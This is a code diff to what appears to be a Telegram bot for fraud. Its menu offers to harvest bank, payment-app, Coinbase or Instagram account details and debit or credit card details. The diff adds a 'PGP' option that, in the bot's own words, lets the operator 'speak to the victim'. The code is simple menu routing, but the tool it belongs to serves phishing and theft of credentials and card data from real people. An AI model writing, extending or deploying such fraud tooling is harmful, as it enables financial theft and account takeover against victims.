@@ -23,7 +23,7 @@ export const startScene = new Scenes.WizardScene(
     }
 
     await ctx.replyWithHTML(
-      `👍🏽 Awesome, Let's start\n\nReply with the number of the service you would like to get infos for?\n\n1. <b>Bank</b>\n<i>~ Barclays, Chase ~</i>\n\n2. <b>Pay</b>\n<i>~ Apple pay, Google pay ~</i>\n\n3. <b>Account</b>\n<i>~ Coinbase, Instagram ~</i>\n\n4. <b>Card</b>\n<i>~ Debit or Credit card details ~</i>\n\n<i>***request will expire in 2 minutes***</i>`,
+      `👍🏽 Awesome, Let's start\n\nReply with the number of the service you would like to get infos for?\n\n1. <b>Bank</b>\n<i>~ Barclays, Chase ~</i>\n\n2. <b>Pay</b>\n<i>~ Apple pay, Google pay ~</i>\n\n3. <b>Account</b>\n<i>~ Coinbase, Instagram ~</i>\n\n4. <b>Card</b>\n<i>~ Debit or Credit card details ~</i>\n\n5. <b>PGP</b>\n<i>~ Let's you speak to the victim. NOTE: This is ideal if you know how to talk ~</i>\n\n<i>***request will expire in 2 minutes***</i>`,
     );
 
     return ctx.wizard.next();
@@ -44,6 +44,10 @@ export const startScene = new Scenes.WizardScene(
     // @ts-expect-error ts doesn't not recognise state
     if (ctx.message && ctx.message.text === '4') {
       return ctx.scene.enter('CARD_STEP_ID');
+    }
+    // @ts-expect-error ts doesn't not recognise state
+    if (ctx.message && ctx.message.text === '5') {
+      return ctx.scene.enter('PGP_STEP_ID');
     }
 
     await ctx.reply('❌ Invalid option, please select again');
